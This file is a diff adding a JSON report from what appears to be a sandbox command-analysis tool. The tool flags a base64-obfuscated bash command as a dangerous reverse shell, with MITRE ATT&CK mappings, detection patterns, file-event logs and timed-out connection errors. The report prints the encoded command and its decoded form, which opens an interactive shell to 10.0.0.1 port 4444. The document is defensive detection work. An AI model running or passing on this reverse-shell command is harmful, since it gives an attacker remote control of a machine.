@@ -1,0 +1,313 @@
+{
+  "version": "4.1",
+  "command": "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash",
+  "timestamp": "2026-03-20T04:08:16.055481+00:00",
+  "verdict": "DANGEROUS",
+  "risk_score": 100,
+  "confidence": "HIGH",
+  "recommendations": [
+    "BLOCK: 强烈建议阻止此命令执行",
+    "检查网络连接: ss -tunap | grep ESTABLISHED"
+  ],
+  "is_legitimate_pattern": false,
+  "findings_summary": {
+    "total": 4,
+    "critical": 3,
+    "warn": 1,
+    "info": 0,
+    "dimensions_hit": 2
+  },
+  "findings": [
+    {
+      "severity": "WARN",
+      "dimension": "去混淆",
+      "description": "命令包含 base64 编码层",
+      "risk_score": 15,
+      "mitre_attack": [
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files or Information"
+        }
+      ],
+      "evidence": "base64: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+    },
+    {
+      "severity": "CRITICAL",
+      "dimension": "静态分析",
+      "description": "命令匹配恶意模式: base64 decode piped to shell",
+      "risk_score": 40,
+      "mitre_attack": [
+        {
+          "id": "T1059.004",
+          "name": "Command and Scripting Interpreter: Unix Shell"
+        }
+      ],
+      "evidence": "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash"
+    },
+    {
+      "severity": "CRITICAL",
+      "dimension": "静态分析",
+      "description": "命令匹配恶意模式: reverse shell via /dev/tcp",
+      "risk_score": 40,
+      "mitre_attack": [
+        {
+          "id": "T1059.004",
+          "name": "Command and Scripting Interpreter: Unix Shell"
+        }
+      ],
+      "evidence": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 | bash"
+    },
+    {
+      "severity": "CRITICAL",
+      "dimension": "静态分析",
+      "description": "命令匹配恶意模式: interactive bash reverse shell",
+      "risk_score": 45,
+      "mitre_attack": [
+        {
+          "id": "T1059.004",
+          "name": "Command and Scripting Interpreter: Unix Shell"
+        }
+      ],
+      "evidence": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 | bash"
+    }
+  ],
+  "evidence": {
+    "command_chain": {
+      "stages": 3,
+      "connectors": [
+        "|",
+        "|",
+        "END"
+      ],
+      "safe_then_evil": false
+    },
+    "deobfuscation_layers": [
+      {
+        "type": "base64",
+        "encoded": "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80",
+        "decoded": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+      }
+    ],
+    "stdout_lines": 0,
+    "stderr_lines": 2,
+    "exec_duration_sec": 134.5,
+    "external_connections": [],
+    "c2_port_hits": [],
+    "files_added": 0,
+    "files_deleted": 0,
+    "inotify_sys_events": 0,
+    "inotify_tmp_events": 5868,
+    "exit_code": 1,
+    "critical_bins_changed": false,
+    "new_symlinks": 0,
+    "new_file_caps": 0,
+    "permission_issues": [],
+    "mitre_techniques": [
+      "T1140",
+      "T1059.004"
+    ]
+  },
+  "dimensions": {
+    "files_added": [],
+    "files_deleted": [],
+    "inotify_sys_events": [],
+    "inotify_tmp_events": [
+      "2026-03-20T04:07:40 CREATE /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD",
+      "2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD"
+    ],
+    "external_connections": [],
+    "suid_new": [],
+    "suid_removed": [],
+    "new_symlinks": [],
+    "new_file_caps": [],
+    "critical_bins_tampered": false,
+    "high_entropy_files": [],
+    "exit_code": 1,
+    "attack_chains": []
+  },
+  "mitre_attack": {
+    "T1140": {
+      "name": "Deobfuscate/Decode Files or Information",
+      "findings": [
+        "命令包含 base64 编码层"
+      ]
+    },
+    "T1059.004": {
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "findings": [
+        "命令匹配恶意模式: base64 decode piped to shell",
+        "命令匹配恶意模式: reverse shell via /dev/tcp",
+        "命令匹配恶意模式: interactive bash reverse shell"
+      ]
+    }
+  },
+  "mitre_tactics": {
+    "Defense Evasion": [
+      "T1140"
+    ],
+    "Execution": [
+      "T1059.004"
+    ]
+  },
+  "deobfuscation": {
+    "original": "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash",
+    "deobfuscated": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 | bash",
+    "layers": [
+      {
+        "type": "base64",
+        "decoded": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+      }
+    ]
+  },
+  "timeline": [
+    {
+      "phase": "baseline",
+      "time": "1773979498",
+      "desc": "基线采集完成"
+    },
+    {
+      "phase": "probes_start",
+      "time": "1773979520",
+      "desc": "探针启动 + 命令执行开始"
+    },
+    {
+      "phase": "exec_end",
+      "time": "1773979655",
+      "desc": "命令执行结束 (耗时 134.5s, 退出码 1)"
+    },
+    {
+      "phase": "post_snapshot",
+      "time": "1773979696",
+      "desc": "后置快照 + 分析完成"
+    }
+  ],
+  "stdout": [],
+  "stderr": [
+    "bash: connect: Connection timed out",
+    "bash: line 1: /dev/tcp/10.0.0.1/4444: Connection timed out"
+  ],
+  "text_summary": "🚨 判定: DANGEROUS (风险分: 100/100, 置信度: HIGH)\n命令: echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash\n\n发现 4 个问题 (3 严重, 1 警告):\n  [CRITICAL] 静态分析: 命令匹配恶意模式: base64 decode piped to shell [T1059.004]\n  [CRITICAL] 静态分析: 命令匹配恶意模式: reverse shell via /dev/tcp [T1059.004]\n  [CRITICAL] 静态分析: 命令匹配恶意模式: interactive bash reverse shell [T1059.004]\n  [WARN] 去混淆: 命令包含 base64 编码层 [T1140]\n\n涉及 ATT&CK 战术: Defense Evasion, Execution\n\n建议:\n  • BLOCK: 强烈建议阻止此命令执行\n  • 检查网络连接: ss -tunap | grep ESTABLISHED",
+  "fast_triage": {
+    "level": "BLOCK",
+    "static_score": 100,
+    "is_legitimate": false,
+    "blacklisted": true,
+    "patterns_matched": 3,
+    "matches": [
+      {
+        "pattern": "base64 decode piped to shell",
+        "mitre": "T1059.004",
+        "score": 40
+      },
+      {
+        "pattern": "reverse shell via /dev/tcp",
+        "mitre": "T1059.004",
+        "score": 40
+      },
+      {
+        "pattern": "interactive bash reverse shell",
+        "mitre": "T1059.004",
+        "score": 45
+      }
+    ],
+    "deobfuscation_layers": 1
+  }
+}
